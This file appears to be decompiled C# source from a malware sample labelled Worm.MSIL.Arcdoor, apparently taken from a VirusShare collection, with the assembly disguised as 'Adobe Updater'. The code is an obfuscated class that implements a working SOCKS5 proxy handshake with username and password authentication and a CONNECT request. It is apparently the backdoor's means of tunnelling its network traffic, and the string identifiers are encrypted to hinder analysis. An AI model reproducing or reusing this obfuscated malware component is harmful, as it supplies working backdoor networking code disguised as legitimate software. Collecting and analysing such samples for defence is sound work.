// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

public sealed class \u000F\u2000
{
  private static string[] \u0002 = new string[10]
  {
    \u000F\u2001.\u0002(670212107),
    \u000F\u2001.\u0002(670212131),
    \u000F\u2001.\u0002(670212167),
    \u000F\u2001.\u0002(670212208),
    \u000F\u2001.\u0002(670213019),
    \u000F\u2001.\u0002(670213027),
    \u000F\u2001.\u0002(670213069),
    \u000F\u2001.\u0002(670213072),
    \u000F\u2001.\u0002(670213117),
    \u000F\u2001.\u0002(670212895)
  };

  private \u000F\u2000()
  {
  }

  public static Socket \u0002(
    string _param0,
    int _param1,
    string _param2,
    ushort _param3,
    string _param4,
    string _param5)
  {
    IPAddress ipAddress = (IPAddress) null;
    byte[] buffer1 = new byte[257];
    byte[] buffer2 = new byte[257];
    IPAddress address;
    try
    {
      address = IPAddress.Parse(_param0);
    }
    catch (FormatException ex)
    {
      address = Dns.GetHostByAddress(_param0).AddressList[0];
    }
    try
    {
      ipAddress = IPAddress.Parse(_param2);
    }
    catch (FormatException ex)
    {
    }
    IPEndPoint remoteEP = new IPEndPoint(address, _param1);
    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    socket.Connect((EndPoint) remoteEP);
    ushort num1 = 0;
    byte[] numArray1 = buffer1;
    int index1 = (int) num1;
    ushort num2 = (ushort) (index1 + 1);
    numArray1[index1] = (byte) 5;
    byte[] numArray2 = buffer1;
    int index2 = (int) num2;
    ushort num3 = (ushort) (index2 + 1);
    numArray2[index2] = (byte) 2;
    byte[] numArray3 = buffer1;
    int index3 = (int) num3;
    ushort num4 = (ushort) (index3 + 1);
    numArray3[index3] = (byte) 0;
    byte[] numArray4 = buffer1;
    int index4 = (int) num4;
    ushort size1 = (ushort) (index4 + 1);
    numArray4[index4] = (byte) 2;
    socket.Send(buffer1, (int) size1, SocketFlags.None);
    if (socket.Receive(buffer2, 2, SocketFlags.None) != 2)
      throw new \u000E\u2000(\u000F\u2001.\u0002(670212473));
    if (buffer2[1] == byte.MaxValue)
    {
      socket.Close();
      throw new \u000E\u2000(\u000F\u2001.\u0002(670212264));
    }
    ushort num5 = 0;
    byte[] numArray5 = buffer1;
    int index5 = (int) num5;
    ushort num6 = (ushort) (index5 + 1);
    numArray5[index5] = (byte) 5;
    byte[] numArray6 = buffer1;
    int index6 = (int) num6;
    ushort index7 = (ushort) (index6 + 1);
    int length1 = (int) (byte) _param4.Length;
    numArray6[index6] = (byte) length1;
    byte[] bytes1 = Encoding.Default.GetBytes(_param4);
    bytes1.CopyTo((Array) buffer1, (int) index7);
    ushort num7 = (ushort) ((uint) index7 + (uint) (ushort) bytes1.Length);
    byte[] numArray7 = buffer1;
    int index8 = (int) num7;
    ushort index9 = (ushort) (index8 + 1);
    int length2 = (int) (byte) _param5.Length;
    numArray7[index8] = (byte) length2;
    byte[] bytes2 = Encoding.Default.GetBytes(_param5);
    bytes2.CopyTo((Array) buffer1, (int) index9);
    ushort size2 = (ushort) ((uint) index9 + (uint) (ushort) bytes2.Length);
    socket.Send(buffer1, (int) size2, SocketFlags.None);
    if (socket.Receive(buffer2, 2, SocketFlags.None) != 2)
      throw new \u000E\u2000(\u000F\u2001.\u0002(670212473));
    if (buffer2[1] != (byte) 0)
      throw new \u000E\u2000(\u000F\u2001.\u0002(670212334));
    ushort num8 = 0;
    byte[] numArray8 = buffer1;
    int index10 = (int) num8;
    ushort num9 = (ushort) (index10 + 1);
    numArray8[index10] = (byte) 5;
    byte[] numArray9 = buffer1;
    int index11 = (int) num9;
    ushort num10 = (ushort) (index11 + 1);
    numArray9[index11] = (byte) 1;
    byte[] numArray10 = buffer1;
    int index12 = (int) num10;
    ushort size3 = (ushort) (index12 + 1);
    numArray10[index12] = (byte) 0;
    if (ipAddress != null)
    {
      switch (ipAddress.AddressFamily)
      {
        case AddressFamily.InterNetwork:
          byte[] numArray11 = buffer1;
          int index13 = (int) size3;
          ushort index14 = (ushort) (index13 + 1);
          numArray11[index13] = (byte) 1;
          byte[] addressBytes1 = ipAddress.GetAddressBytes();
          addressBytes1.CopyTo((Array) buffer1, (int) index14);
          size3 = (ushort) ((uint) index14 + (uint) (ushort) addressBytes1.Length);
          break;
        case AddressFamily.InterNetworkV6:
          byte[] numArray12 = buffer1;
          int index15 = (int) size3;
          ushort index16 = (ushort) (index15 + 1);
          numArray12[index15] = (byte) 4;
          byte[] addressBytes2 = ipAddress.GetAddressBytes();
          addressBytes2.CopyTo((Array) buffer1, (int) index16);
          size3 = (ushort) ((uint) index16 + (uint) (ushort) addressBytes2.Length);
          break;
      }
    }
    else
    {
      byte[] numArray13 = buffer1;
      int index17 = (int) size3;
      ushort num11 = (ushort) (index17 + 1);
      numArray13[index17] = (byte) 3;
      byte[] numArray14 = buffer1;
      int index18 = (int) num11;
      ushort index19 = (ushort) (index18 + 1);
      int num12 = (int) Convert.ToByte(_param2.Length);
      numArray14[index18] = (byte) num12;
      byte[] bytes3 = Encoding.Default.GetBytes(_param2);
      bytes3.CopyTo((Array) buffer1, (int) index19);
      size3 = (ushort) ((uint) index19 + (uint) (ushort) bytes3.Length);
    }
    byte[] bytes4 = BitConverter.GetBytes(_param3);
    for (int index20 = bytes4.Length - 1; index20 >= 0; --index20)
      buffer1[(int) size3++] = bytes4[index20];
    socket.Send(buffer1, (int) size3, SocketFlags.None);
    socket.Receive(buffer2);
    if (buffer2[1] != (byte) 0)
      throw new \u000E\u2000(\u000F\u2000.\u0002[(int) buffer2[1]]);
    return socket;
  }
}
